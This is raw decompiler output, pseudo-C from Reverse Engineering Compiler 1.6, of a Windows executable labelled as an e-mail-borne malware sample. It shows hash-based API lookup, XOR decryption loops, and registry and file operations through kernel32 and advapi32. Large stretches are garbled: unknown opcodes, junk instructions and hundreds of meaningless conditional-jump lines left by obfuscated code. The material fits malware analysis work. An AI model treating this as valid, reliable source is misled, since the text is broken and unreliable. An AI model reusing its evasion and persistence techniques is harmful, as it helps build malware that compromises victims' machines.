/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0118/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 0040100f -> 00401075 */
/* DEST BLOCK NOT FOUND: 00401073 -> 00401078 */
/*	Procedure: 0x00401000 - 0x0040105A
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401000(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    if(*L00405000 == 0) {
        goto L00401014;
        asm("outsb");
        == ? L00401075 : ;
        asm("insb");
        asm("insb");
        *(eax + 14) = *(eax + 14) + ch;
L00401014:
        asm("adc [eax+0x0],al");
        LoadLibraryA();
        *L00405000 = eax;
    }
    if(*L00405004 == 0) {
        *L00405004 = L00401091( *L00405000, -1777856063);
    }
    (save)A8;
    eax = L00401091(LoadLibraryA(), Ac);
    if(eax == 0) {
        asm("int3");
    }
}

/*	Procedure: 0x0040105B - 0x00401090
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040105B(A8)
/* unknown */ void  A8;
{



    esp = esp + -4;
    asm("pusha");
    edi = A8;
    ebx = 0;
    ecx = 0;
    do {
        cl = cl ^ *edi;
        for(bl = bl ^ *edi; cl >= 32; cl = cl - 32) {
        }
        asm("rol ebx,cl");
        edi = edi + 1;
    } while(*edi != 0);
    *(ebp - 4) = ebx;
    asm("popa");
    return(*(ebp - 4));
}

/*	Procedure: 0x00401091 - 0x00401124
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401091(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    esp = esp + -20;
    if(A8 == 0) {
        return;
    }
    *(ebp - 20) = 0;
    eax = *(A8 + 60);
    if(*(eax + A8) == 17744) {
        ecx = *(eax + A8 + 120);
        if(ecx != 0) {
            ecx = ecx + A8;
            edx = *(ecx + 24);
            eax = *(ecx + 28);
            esi = *(ecx + 32);
            edi = *(ecx + 36);
            eax = eax + A8;
            *(ebp - 8) = edx;
            *(ebp - 16) = eax;
            *(ebp - 12) = edi + A8;
            esi = esi + A8;
            *(ebp - 4) = edx;
            do {
                if(L0040105B( *esi + A8) == Ac) {
                    goto L004010ff;
                }
                esi = esi + 4;
            } while(*(ebp - 4) = *(ebp - 4) - 1);
            goto L0040111e;
L004010ff:
            eax = *(ebp - 8);
            edx = *(ebp - 12);
            edx = *(edx + (eax - *(ebp - 4)) * 2);
            eax = *(ebp - 16);
            *(ebp - 20) = *(eax + (edx & 65535) * 4) + A8;
        }
    }
L0040111e:
    eax = *(ebp - 20);
    esp = ebp;
}

/*	Procedure: 0x00401125 - 0x00401197
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401125(A8, Ac, A10, A72)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A72;
{



    asm("pusha");
    goto L00401134;
    110 = A72 * esp;
    asm("%g insb");
    esi = esi ^ *edx;
    bl = bl + ch;
L00401134:
    al = al + 183;
    ecx = ecx - 1;
    eax & 1410099307;
    eax = eax + 1;
    *(edx + 64) = *(edx + 64) + ch;
    (save)Ac;
    (save)A8;
    L00401000("kernel32", *L00401136);
    if(eax != 0) {
        *eax();
    }
    eax = A8;
    ecx = 0;
    ebx = A10;
    do {
        dh = *eax;
        (save)eax + 1;
        eax = 0;
        (restore)eax;
        (save) *eax;
        edx = 0;
        (restore)edx;
        *ebx = dh ^ dl;
        (save)ebx + 1;
        ebx = 0;
        (restore)ebx;
        eax = eax + 1;
        ecx = ecx + 1;
    } while(ecx < Ac);
    asm("popa");
}

/*	Procedure: 0x00401198 - 0x004011B7
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401198(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    asm("pusha");
    asm("cld");
    ecx = Ac >> 2;
    eax = 0;
    asm("rep stosd");
    ecx = Ac & 3;
    asm("rep stosb");
    asm("popa");
}

/*	Procedure: 0x004011B8 - 0x00401209
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L004011B8(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    asm("pusha");
    (save)4215820;
    (save)64;
    (save)Ac;
    (save)A8;
    eax = L00401000("kernel32", *L00401136);
    if(eax != 0) {
        *eax();
    }
    ecx = A8;
    eax = 0;
    eax = 0;
    edx = A8 + Ac;
    eax = A10;
    do {
        *ecx = *ecx ^ al;
        eax = 0;
        ecx = ecx + 1;
    } while(edx >= ecx);
    asm("popa");
}

stack space not deallocated on return
/*	Procedure: 0x0040120A - 0x0040122B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040120A()
{



    (save)ebp;
    ebp = esp;
    asm("pusha");
    edx = *(ebp + 8);
    eax = *edx & 255;
    (save)eax;
    (save) *(ebp + 12);
    (save) *(ebp + 8) + 1;
    (save)0x40122c;
    (save)0x4011b8;
}

/*	Procedure: 0x0040122C - 0x00401230
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040122C()
{



    asm("popa");
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00401231 - 0x00401244
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401231()
{



    (save)ebp;
    ebp = esp;
    (save) *(ebp + 16);
    (save) *(ebp + 12);
    (save)0x401245;
    (save)0x401198;
}

stack space not deallocated on return
/*	Procedure: 0x00401245 - 0x00401261
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401245()
{



    eax = *(ebp + 8) + 1;
    ecx = *eax & 65535;
    eax = eax + 1 + 1;
    (save) *(ebp + 12);
    (save)ecx;
    (save)eax;
    (save)0x401262;
    (save)0x401125;
}

/*	Procedure: 0x00401262 - 0x00401265
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401262()
{



    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00401266 - 0x00401281
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401266()
{



    (save)ebp;
    ebp = esp;
    asm("pusha");
    (save)1024;
    (save)4214796;
    (save) *(ebp + 8);
    (save)0x401282;
    (save)0x401231;
}

/*	Procedure: 0x00401282 - 0x00401286
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401282()
{



    asm("popa");
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x00401287 - 0x0040136F
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401287(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    goto L00401291;
    asm("Unknown opcode 0xfe");
    dl = 212;
    bh = bh >> 1;
L00401291:
    != ? 0x4012a0 : ;
    eax = L00401000("kernel32", *L0040128D);
    if(eax != 0) {
        eax = *eax();
    }
    *L00405424 = eax;
    *L00405428 = eax;
    if(eax != 0) {
        (save)A8;
        eax = L00401000("kernel32", *L0040128D);
        if(eax != 0) {
            eax = *eax();
        }
        *L0040542C = eax;
        *L0040542C = *L0040542C + 1;
        if(eax == 0) {
            goto L00401359;
        }
        while(1) {
L004012f4:
            (save) *L0040542C;
            (save)Ac;
            (save)4215856;
            eax = L00401000("kernel32", *L004012F0);
            if(eax != 0) {
                eax = *eax();
            }
L00401320:
            *(eax + eax * 2) = *(eax + eax * 2) ^ dl;
            (save)A8;
            L00401000("kernel32", *L0040131C);
            if(eax != 0) {
                eax = *eax();
            }
            if(eax == 0) {
                goto L0040135e;
            }
            if(*L00405428 == 0) {
                goto L00401359;
            }
            *L00405428 = *L00405428 - 1;
            Ac = Ac + 1;
        }
        dh = dh ^ *(esp + edi * 4 - 44);
        goto L004012f4;
        asm("into");
        *(edi + ebx * 8 + 104) = *(edi + ebx * 8 + 104) + ebx;
        goto L00401320;
    }
L00401359:
    eax = 0;
    goto L0040136c;
L0040135e:
    eax = *L00405424 - *L00405428 + 1;
L0040136c:
}

stack space not deallocated on return
/*	Procedure: 0x00401370 - 0x00401474
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401370()
{



    (save)ebp;
    ebp = esp;
    goto L00401379;
    asm("aad 0xaa");
    asm("outsb");
    asm("out 0x6a,al");
L00401379:
    *(edx + 2) = *(edx + 2) + ch;
    L00401000("kernel32", *L00401375);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax != -1) {
        *L00405535 = eax;
        *L00405539 = 296;
        goto L004013b3;
        asm("out dx,eax");
        asm("stc");
        *(ebx + 1079327080) = *(ebx + 1079327080) - cl;
L004013b3:
        bh = bh + bh;
        eax = eax ^ 4216117;
        L00401000("kernel32", *L004013AF);
        if(eax != 0) {
            eax = *eax();
        }
        if(eax == 1) {
L004013df:
            (save)4216157;
            (save)0x4013ef;
            (save)0x40105b;
            return;
            if(eax == *(ebp + 8)) {
                goto L004013fa;
                al :: 208;
                asm("in al,dx");
                asm("jecxz 0x4013fa");
L004013fa:
                eax = eax ^ 4216117;
                eax = L00401000("kernel32", *L004013F6);
                if(eax != 0) {
                    *eax();
                }
                eax = *L00405541;
            } else {
                goto L00401427;
                *edx = *edx - -7;
                al = al ^ 104;
L00401427:
                *(ebp + 64) :: edx;
                bh = bh + bh;
                eax = eax ^ 4216117;
                L00401000("kernel32", *L00401423);
                if(eax != 0) {
                    eax = *eax();
                }
                if(eax != 0) {
                    goto L004013df;
                }
                (save) *L00405535;
                eax = L00401000("kernel32", *L004013F6);
                if(eax != 0) {
                    *eax();
                }
                eax = 0;
            }
        }
    }
    (restore)ebp;
}

/*	Procedure: 0x00401475 - 0x00401491
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 16
 */

L00401475(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  eax;



    asm("cld");
    asm("rep movsb");
}

/* DEST BLOCK NOT FOUND: 004015e2 -> 00401654 */
/* DEST BLOCK NOT FOUND: 00401633 -> 004017c1 */
/* DEST BLOCK NOT FOUND: 00401650 -> 00401656 */
stack space not deallocated on return
/*	Procedure: 0x00401492 - 0x0040161C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401492()
{



    (restore)ebp;
    (save)cs;
    *(ecx + -1714518575) = (frestore);
    (save)edi;
    (save)ss;
    al = al ^ 123 ^ 102;
    dh = 243;
    if(!( *ecx = *ecx + cl)) {
        asm("rcl dword [ebp+ebx*8+0xa70560ae],1");
        asm("ror edi,cl");
        asm("xchg eax,ebx");
        dh = 248;
        asm("sbb al,0x73");
        asm("Unknown opcode 0xc7");
        *L98DBE7BB = eax;
        != ? 0x4014bd : ;
        asm("cdq");
    } else {
        while(1) {
            asm("fisubr word [esi+0x1c]");
            eax = eax ^ 21;
            if(!(al = al + 187)) {
                break;
            }
            *(ecx + 425277388) = *(ecx + 425277388) ^ ebp;
            asm("insd");
            (save)edx;
        }
        asm("Unknown opcode 0x82");
        asm("o16 or [eax+ecx-0xa],dl");
        ah = ah ^ *LD3B3972A;
        if(edi = edi + 1) {
            goto L0040153e;
        }
        al = al + 8;
        ecx = ecx - 1;
        asm("popf");
        asm("rcl byte [eax+0x4f8ac4df],1");
        asm("adc ebp,eax");
        ebx = 1913053317;
        asm("out 0x92,al");
        (restore)edi;
        asm("%s js 0x401513");
        asm("fidivr dword [ebp+0x35f0b78]");
    }
    (al ^ 119) :: 83;
    asm("int1");
    asm("lahf");
    asm("Unknown opcode 0x82");
    asm("in al,0xc5");
    al = *esi;
    (save)-1488093937;
    asm("xchg eax,edi");
    if(!(esi = esi + 1)) {
        (fsave) *(edi + -2098734455);
        asm("fsubr dword [eax+edx*2+0xa0a9c024]");
        asm("into");
        cl = 214;
        return;
        eax = *L00000000;
        (save)cs;
        if(108 = *(esp + edx + 15) * ebp) {
            goto L00401576;
        }
        >= ? 0x4015a5 : ;
        >= ? 0x401563 : ;
        >= ? 0x40156d : ;
        >= ? 0x40154e : ;
        >= ? 0x401543 : ;
        >= ? 0x401556 : ;
L0040153e:
        >= ? 0x401552 : ;
        >= ? 0x401556 : ;
        >= ? 0x401571 : ;
        >= ? 0x40157f : ;
        >= ? 0x401558 : ;
        >= ? 0x40154d : ;
        >= ? 0x401561 : ;
        >= ? 0x401563 : ;
        >= ? 0x401568 : ;
        >= ? 0x401554 : ;
        >= ? 0x40156e : ;
        >= ? 0x40157d : ;
        >= ? 0x401576 : ;
        >= ? 0x401577 : ;
        >= ? 0x401560 : ;
        >= ? 0x40157a : ;
    }
    >= ? 0x401574 : ;
    >= ? 0x4015a2 : ;
    >= ? 0x401591 : ;
    >= ? 0x4015d7 : ;
    >= ? 0x4015d9 : ;
    >= ? 0x4015db : ;
    >= ? 0x4015dc : ;
    >= ? 0x4015b1 : ;
    >= ? 0x4015e1 : ;
    >= ? 0x40159f : ;
    >= ? 0x4015a9 : ;
    >= ? 0x40158a : ;
L00401576:
    >= ? 0x40157f : ;
    >= ? 0x401592 : ;
    >= ? 0x40158e : ;
    >= ? 0x401592 : ;
    >= ? 0x4015ad : ;
    >= ? 0x4015bb : ;
    >= ? 0x401594 : ;
    >= ? 0x401589 : ;
    >= ? 0x40159d : ;
    >= ? 0x40159f : ;
    >= ? 0x4015a4 : ;
    >= ? 0x401590 : ;
    >= ? 0x4015aa : ;
    >= ? 0x4015b9 : ;
    >= ? 0x4015b2 : ;
    >= ? 0x4015b3 : ;
    >= ? 0x40159c : ;
    >= ? 0x4015b6 : ;
    >= ? 0x4015b0 : ;
    >= ? 0x4015e1 : ;
    >= ? 0x4015cd : ;
    >= ? 0x401613 : ;
    >= ? 0x401615 : ;
    >= ? 0x401617 : ;
    >= ? 0x401618 : ;
    >= ? 0x4015ed : ;
    >= ? 0x40161d : ;
    >= ? 0x4015db : ;
    >= ? 0x4015e5 : ;
    >= ? 0x4015c6 : ;
    >= ? 0x4015bb : ;
    >= ? 0x4015ce : ;
    >= ? 0x4015ca : ;
    >= ? 0x4015ce : ;
    >= ? 0x4015e9 : ;
    >= ? 0x4015f7 : ;
    >= ? 0x4015d0 : ;
    >= ? 0x4015c5 : ;
    >= ? 0x4015d9 : ;
    >= ? 0x4015db : ;
    >= ? 0x4015e0 : ;
    >= ? 0x4015cc : ;
    >= ? 0x4015e6 : ;
    >= ? 0x4015f5 : ;
    >= ? 0x4015ee : ;
    >= ? 0x4015ef : ;
    >= ? 0x4015d8 : ;
    >= ? 0x4015f2 : ;
    >= ? 0x4015ec : ;
    >= ? 0x40161c : ;
    >= ? 0x401609 : ;
    >= ? 0x40164f : ;
    >= ? 0x401651 : ;
    >= ? 0x401653 : ;
    >= ? 0x401654 : ;
    >= ? 0x401574 : ;
    asm("Unknown opcode 0x8e");
    asm("Unknown opcode 0x8e");
    es = *eax;
    *(ebp + 103) = *(ebp + 103) + bl;
    asm("cwde");
    asm("xchg eax,edi");
    goto L004015f7;
    *ebx = *ebx + edx;
    *(edx + ebp * 2 + 40) = *(edx + ebp * 2 + 40) & ecx;
L004015f7:
    eax = L00401000("kernel32", *L004015F1);
    if(eax != 0) {
        eax = *eax();
    }
    (save) *L0040566D;
    (restore)ecx;
    *L00405671 = ecx;
}

/* DEST BLOCK NOT FOUND: 00401633 -> 004017c1 */
/* DEST BLOCK NOT FOUND: 0040171e -> 004017c1 */
/* DEST BLOCK NOT FOUND: 004017bb -> 004017c1 */
/* DEST BLOCK NOT FOUND: 004017bf -> 004017c1 */
stack space not deallocated on return
/*	Procedure: 0x0040161D - 0x004017C1
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040161D()
{



    al = *L004015EB ^ 21;
    (save)eax;
    (save)0x401630;
    (save)0x401370;
    return;
    if(eax > 0) {
        *L00405669 = eax;
        (save)0x401527;
        (save)0x401650;
        (save)0x401266;
        return;
        goto L00401656;
        eax = L68ad4bcf();
L00401656:
        *((al | 80) + 1 + 117) = *((al | 80) + 1 + 117) + ch;
        eax = eax + 1;
        bh = bh + bh;
        eax = eax ^ 0x401652;
        L00401000("kernel32", esi);
        if(eax != 0) {
            eax = *eax();
        }
        (save)0x401492;
        (save)0x401688;
        (save)0x401266;
        return;
        goto "ëgNûåhaV@";
        asm("popa");
        asm("%f jna 0x4016ef");
        >= ? 0x4016f9 : ;
        esi = esi ^ *edx;
        bl = bl + ch;
        al = al + 103;
        esi = esi - 1;
        asm("sti");
        asm("in eax,0x68");
        asm("popa");
        (save)esi;
        *(eax + 1 + 12) = *(eax + 1 + 12) + ch;
        (save)eax;
        *(eax + 1 + 2) = *(eax + 1 + 2) + ch;
        *eax = *eax + al;
        bh :: 53;
        asm("xchg eax,ebp");
        (save)ss;
        *(eax + 1 - 118) = *(eax + 1 - 118) + ch;
        (save)ss;
        eax = eax + 1 + ch - 1;
        asm("stc");
        asm("Unknown opcode 0xff");
        asm("Unknown opcode 0xc0");
        if(!( *ebx = *ebx - 1)) {
            eax = *eax();
        }
        (save)0x401527;
        (save)0x4016d0;
        (save)0x401266;
        return;
        (save)186;
        (save)0x401530;
        (save)0x4016e5;
        (save)0x40120a;
        return;
        goto L004016eb;
        asm("a16 popf");
        asm("pushf");
        asm("cmpsd");
L004016eb:
        (save)184;
        (save)0x401530;
        (save)3;
        (save)0;
        (save)4214796;
        (save) *L00405661;
        eax = L00401000("advapi32", *L004016E7);
        if(eax != 0) {
            eax = *eax();
        }
        if(eax == 0) {
            *L00405665 = 3;
            (save)4;
            (save)4216421;
            (save)4;
            (save)0;
            (save)4216437;
            (save) *L00405661;
            eax = L00401000("advapi32", *L004016E7);
            if(eax != 0) {
                *eax();
            }
            (save) *L00405661;
            (save) *L004013F6;
L00401766:
            (save)"kernel32";
            eax = L00401000();
            if(eax != 0) {
                *eax();
            }
            goto L0040177e;
            *edi = *esi;
            edi = edi + 1;
            if(esi = esi + 1) {
                goto L00401766;
            }
            ecx = ecx - 1;
L0040177e:
            (save) *L00405669;
            (save)0;
            (save)1;
            eax = L00401000("kernel32", *L0040177A);
            if(eax != 0) {
                *eax();
            }
            goto L004017a6;
            (restore)ebp;
            (save)edi;
            *(edx + ebp * 2 + 905924609) = *(edx + ebp * 2 + 905924609) | ah;
L004017a6:
            *L68004017 = al;
            edx = edx - *ecx;
            al = eax + 1 + ch;
            edi = edi + 1;
            asm("clc");
            asm("Unknown opcode 0xff");
            asm("Unknown opcode 0xc0");
            if(!( *ebx = *ebx - 1)) {
                *eax();
            }
        }
    }
}

stack space not deallocated on return
/*	Procedure: 0x004017C2 - 0x00401842
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004017C2()
{



    *edx = *edx + dl;
    *(edx + 607354105) = *(edx + 607354105) + ch;
    asm("bound eax,[ecx+0x5fb8efd5]");
    edx = ds;
    *(ebp + 40) = *(ebp + 40) | ch;
    asm("fnstcw [edx+0x84eb80f2]");
    (eax ^ 83) :: 233;
    asm("Unknown opcode 0x8f");
    al = *esi;
    esi = esi + 1;
    (fsave) *(ecx + 426834870) + *eax;
    (restore)es;
    ch = ch + ch;
    *edi = *esi;
    edi = edi + 1;
    esi = esi + 1;
    asm("cmpsb");
    asm("enter 0xcdbe,0xe4");
    esp = esp - 1;
    eax = eax - -1028738338;
    asm("%f xor al,0x0");
    (save)ebp;
    ebp = esp;
    esp = esp + -12;
    goto L0040180a;
    *(eax + 292167505) = *(eax + 292167505) ^ ebp;
L0040180a:
    (save)64;
    L00401000("kernel32", *L00401806);
    if(eax != 0) {
        eax = *eax();
    }
    *(ebp - 8) = eax;
    (save)1024;
    (save)4216457;
    (save)0x4017c2;
    (save)0x401843;
    (save)0x401231;
}

stack space not deallocated on return
/*	Procedure: 0x00401843 - 0x00401934
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401843()
{



    goto L00401849;
    eax = *(edx + eax * 2);
    *(ebp + 1750137925) = *(ebp + 1750137925) - 1;
L00401849:
    asm("sbb [eax],eax");
    al = al + *eax;
    (save)0;
    (save)4216457;
    (save)-2147483646;
    L00401000("advapi32", *L00401845);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax == 0) {
        *(ebp - 12) = 17;
        (save)1024;
        (save)4216457;
        (save)0x4017e9;
        (save)0x40189f;
        (save)0x401231;
        return;
        goto L004018a5;
        cl = cl | *(eax + 1166917572);
L004018a5:
        asm("hlt");
        (save)eax;
        (save) *(ebp - 8);
        (save)0;
        (save)0;
        (save)4216457;
        (save) *(ebp - 4);
        L00401000("advapi32", *L004018A1);
        if(eax != 0) {
            eax = *eax();
        }
        if(eax != 0) {
            eax = 0;
        } else {
            (save) *(ebp - 8);
            (save)0x4017fa;
            eax = L00401000("kernel32", *L0040131C);
            if(eax != 0) {
                eax = *eax();
            }
            eax = eax == 0 ? 1 : 0;
        }
    } else {
        eax = 0;
    }
    for((save)eax; al = al & cl; asm("ror byte [edx-0x1],cl");) {
    }
    eax = L00401000("kernel32", *L00401913);
    if(eax != 0) {
        *eax();
    }
    (restore)eax;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00401935 - 0x00401954
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401935()
{



    (save)ebp;
    ebp = esp;
    esp = esp + -4;
    (save)1024;
    (save)4216457;
    (save)0x4017c2;
    (save)0x401955;
    (save)0x401231;
}

stack space not deallocated on return
/*	Procedure: 0x00401955 - 0x004019CC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401955()
{



    (save)ebp - 4;
    (save)983103;
    (save)0;
    (save)4216457;
    (save)-2147483646;
    eax = L00401000("advapi32", *L00401845);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax == 0) {
        (save)1024;
        (save)4216457;
        (save)0x4017e9;
        (save)0x4019a0;
        (save)0x401231;
        return;
        (save)17;
        (save)0x4017fa;
        (save)1;
        (save)0;
        (save)4216457;
        (save) *(ebp - 4);
        eax = L00401000("advapi32", *L004016E7);
        if(eax != 0) {
            eax = *eax();
        }
    }
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x004019CD - 0x00401B49
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004019CD()
{



    *esi = *esi + al;
    *(edi + 60) = *(edi + 60) + ch;
    edi = edi + (edx | *(edx + 80));
    asm("scasb");
    (restore)ds;
    (restore)edx;
    *(ebp + edx * 2 - 117) = *(ebp + edx * 2 - 117) ^ edi;
    asm("in al,dx");
    esp = esp + -4;
    goto L004019e8;
    asm("Unknown opcode 0x8e");
    if(edi < esp) {
L004019e8:
        *(eax - 128) = *(eax - 128) + ch;
        *eax = *eax + al;
        *(edx + 3) = *(edx + 3) + ch;
        (save)0;
        (save)3;
        (save)-2147483648;
        (save) *(ebp + 8);
        eax = L00401000("kernel32", *L004019E4);
        if(eax != 0) {
            eax = *eax();
        }
        if(eax == -1) {
            goto L00401acd;
        }
        *(ebp - 4) = eax;
        goto L00401a27;
        cl = 142;
        cl = 195;
L00401a27:
        (save)0;
        (save) *(ebp - 4);
        eax = L00401000("kernel32", *L00401A23);
        if(eax != 0) {
            eax = *eax();
        }
        *L00405ADC = eax;
        (save) *L00405ADC;
        (save)64;
    }
    eax = L00401000("kernel32", *L00401806);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax != 0) {
        *L00405AD8 = eax;
        goto L00401a7a;
        if(al >= 65) {
            goto L00401ad6;
        }
L00401a7a:
        (save)0;
        (save)4217484;
        (save) *L00405ADC;
        (save) *L00405AD8;
        (save) *(ebp - 4);
        eax = L00401000("kernel32", *L00401A76);
        if(eax != 0) {
            *eax();
        }
        (save) *(ebp - 4);
        eax = L00401000("kernel32", *L004013F6);
        if(eax != 0) {
            *eax();
        }
        eax = 1;
    } else {
        eax = 0;
        goto L00401ad2;
L00401acd:
        eax = 0;
    }
L00401ad2:
    (restore)ebp;
    return;
L00401ad6:
    (save)ebp;
    ebp = esp;
    esp = esp + -4;
    (save)261;
    (save)64;
    eax = L00401000("kernel32", *L00401806);
    if(eax != 0) {
        eax = *eax();
    }
    *(ebp - 4) = eax;
    goto L00401b04;
    al = al | 155;
    *edx = 905904234;
L00401b04:
    *ebx = *ebx + bl;
    *(eax + 1 + 43) = *(eax + 1 + 43) + ch;
    asm("adc [eax+0x0],eax");
    L00401000();
    if(eax != 0) {
        eax = *eax();
    }
    goto L00401b24;
    asm("int 0xed");
    *(eax + ebp * 2) = *(eax + ebp * 2) | ecx;
L00401b24:
    *(al + 1) = *(al + 1) + al + 1;
    (save) *(ebp - 4);
    (save)eax;
    L00401000("kernel32", *L00401B20);
    if(eax != 0) {
        *eax();
    }
    eax = *(ebp - 4);
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00401B4A - 0x00401B5A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B4A()
{



    (save)ebp;
    ebp = esp;
    esp = esp + -16;
    (save)0x401b5b;
    (save)0x401ad6;
}

stack space not deallocated on return
/*	Procedure: 0x00401B5B - 0x00401CA4
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B5B()
{



    *(ebp - 8) = eax;
    (save)0;
    (save)128;
    (save)3;
    (save)0;
    (save)3;
    (save)-2147483648;
    (save) *(ebp - 8);
    eax = L00401000("kernel32", *L004019E4);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax != -1) {
        *(ebp - 4) = eax;
        (save)0;
        (save) *(ebp - 4);
        eax = L00401000("kernel32", *L00401A23);
        if(eax != 0) {
            eax = *eax();
        }
        *(ebp - 12) = eax;
        (save) *(ebp - 12);
        (save)64;
        eax = L00401000("kernel32", *L00401806);
        if(eax != 0) {
            eax = *eax();
        }
        *(ebp - 16) = eax;
        (save)0;
        (save)4217484;
        (save) *(ebp - 12);
        (save) *(ebp - 16);
        (save) *(ebp - 4);
        eax = L00401000("kernel32", *L00401A76);
        if(eax != 0) {
            eax = *eax();
        }
        (save) *(ebp - 4);
        eax = L00401000("kernel32", *L004013F6);
        if(eax != 0) {
            eax = *eax();
        }
        (save)0;
        (save)128;
        (save)5;
        (save)0;
        (save)3;
        (save)-1073741824;
        (save) *(ebp + 8);
        eax = L00401000("kernel32", *L004019E4);
        if(eax != 0) {
            eax = *eax();
        }
        if(eax != 0) {
            *(ebp - 4) = eax;
            goto L00401c54;
            esp = esp - 1;
            al = al + 80;
L00401c54:
            (save)0;
            (save)4217484;
            (save) *(ebp - 12);
            (save) *(ebp - 16);
            (save) *(ebp - 4);
            eax = L00401000("kernel32", *L00401C50);
            if(eax != 0) {
                *eax();
            }
            (save) *(ebp - 4);
            eax = L00401000("kernel32", *L004013F6);
            if(eax != 0) {
                eax = *eax();
            }
        } else {
            eax = 0;
        }
    } else {
        eax = 0;
    }
    (restore)ebp;
}

/*	Procedure: 0x00401CA5 - 0x00401D38
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401CA5(A8)
/* unknown */ void  A8;
{



    esp = esp + -4;
    (save)0;
    (save)128;
    (save)5;
    (save)0;
    (save)3;
    (save)1073741824;
    (save)A8;
    eax = L00401000("kernel32", *L004019E4);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax != -1) {
        *(ebp - 4) = eax;
        (save)0;
        (save)4217484;
        (save) *L00405ADC;
        (save) *L00405AD8;
        (save) *(ebp - 4);
        eax = L00401000("kernel32", *L00401C50);
        if(eax != 0) {
            *eax();
        }
        (save) *(ebp - 4);
        eax = L00401000("kernel32", *L004013F6);
        if(eax != 0) {
            *eax();
        }
        eax = 1;
    } else {
        eax = 0;
    }
}

stack space not deallocated on return
/*	Procedure: 0x00401D39 - 0x00401DD4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401D39()
{



    goto L00401d3f;
    (save)edx;
    ah = ah ^ dl;
    asm("aam 0x68");
L00401d3f:
    *(edx + 64) = ds;
    *(edx + 4) = *(edx + 4) + ch;
    (save)4217516;
    (save) *L00405AA8;
    L00401000("advapi32", *L00401D3B);
    if(eax != 0) {
        *eax();
    }
    (save) *L00405A8C;
    (save)64;
    eax = L00401000("kernel32", *L00401806);
    if(eax != 0) {
        eax = *eax();
    }
    *L00405AAC = eax;
    (save)4217484;
    (save) *L00405A8C;
    (save) *L00405AAC;
    (save) *L00405AA8;
    eax = L00401000("advapi32", *L00401D3B);
    if(eax != 0) {
        *eax();
    }
    edi = *L00405AAC;
    *L00405AB4 = *(edi + 12);
    eax = *edi;
    *L00405AD4 = eax;
    return(*L00405AD4);
}

stack space not deallocated on return
/*	Procedure: 0x00401DD5 - 0x00402305
 *	Argument size: 6144
 *	Local size: 0
 *	Save regs size: 0
 */

L00401DD5()
{



    (save)ebp;
    ebp = esp;
    esp = esp + -4;
    goto L00401de1;
    ch = 202;
    *L00000134 = gs;
L00401de1:
    al = al + 106;
    *edx = *edx + ch;
    L00401000("advapi32", *L00401DDD);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax != 0) {
        *L00405A90 = eax;
        goto L00401e12;
        (save)cs;
        (save)cs;
        asm("xchg eax,esp");
        asm("loop 0x401e7d");
L00401e12:
        *(eax - 100) = *(eax - 100) + ch;
        (restore)edx;
        *(eax + 1 - 104) = *(eax + 1 - 104) + ch;
        (restore)edx;
        eax = eax + 1;
        *(edx + 4) = *(edx + 4) + ch;
        (save)4217492;
        (save)3;
        (save)48;
        (save) *L00405A90;
        L00401000("advapi32", *L00401E0E);
        if(eax != 0) {
            *eax();
        }
        (save) *L00405A98;
        (save)64;
        eax = L00401000("kernel32", *L00401806);
        if(eax != 0) {
            eax = *eax();
        }
